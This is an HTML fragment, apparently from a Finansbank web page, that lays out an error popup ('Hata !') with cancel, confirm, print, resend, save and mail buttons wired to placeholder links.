    <div class="hatamesaji1ConfirmIframe" id="hatamesaji1ConfirmIframe"><div class="floatLeft"><div class="popupheader_left" title="Finansbank"></div></div><div class="header2 floatLeft"><div class="popup_header_icon"><div title=""></div></div><div class="headerErrMsg">Hata !</div><a href="javascript:void(0)"><div title="Kapat" class="close_icon" commandtype="cmdCancel" callbackfunction=""></div></a></div><div class="floatLeft"><div title="Finansbank" class="popupheader_right"></div></div><div class="clearBoth"></div><div style="border-top: 0px none;" class="popupcontentRoundedCornerDiv"><table width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td width="6px"><div class="imgRoundedCornerLeft"></div></td><td class="popupcontentRoundedCornerDiv_middle"></td><td width="6px"><div class="imgRoundedCornerRight"></div></td></tr></table></div><div class="popupcontent"><div class="hata_msj"><iframe scrolling="no" frameborder="0" src="" class="hata_msj_iframe"></iframe></div><div class="popupButtonContainer"><div class="iptal btnClassName" commandtype="cmdCancel" callbackfunction=""><a href="javascript:void(0)"><div id="Div1" width="63" height="21" border="0"></div></a></div><div class="onay btnClassName" commandtype="cmdYes" callbackfunction=""><a href="javascript:void(0)"><div id="Div2" border="0"></div></a></div><div class="print btnClassName" commandtype="cmdPrint" callbackfunction=""><a href="javascript:void(0)"><div id="Div3" border="0"></div></a></div><div class="resend btnClassName" commandtype="cmdResend" callbackfunction=""><a href="javascript:void(0)"><div id="Div4" border="0"></div></a></div><div class="save btnClassName" commandtype="cmdSave" callbackfunction=""><a href="javascript:void(0)"><div id="Div5" border="0"></div></a></div><div class="save btnClassName" commandtype="cmdSentMail" callbackfunction=""><a href="javascript:void(0)"><div id="Div6" border="0"></div></a></div></div></div><div style="border-top: 0px none;" class="popupcontentRoundedCornerDiv_bottom"><table width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td width="6px"><div class="imgRoundedCornerLeft_bottom"></div></td><td class="popupcontentRoundedCornerDiv_middle_bottom"></td><td width="6px"><div class="imgRoundedCornerRight_bottom"></div></td></tr></table></div></div>
</body>
</html>
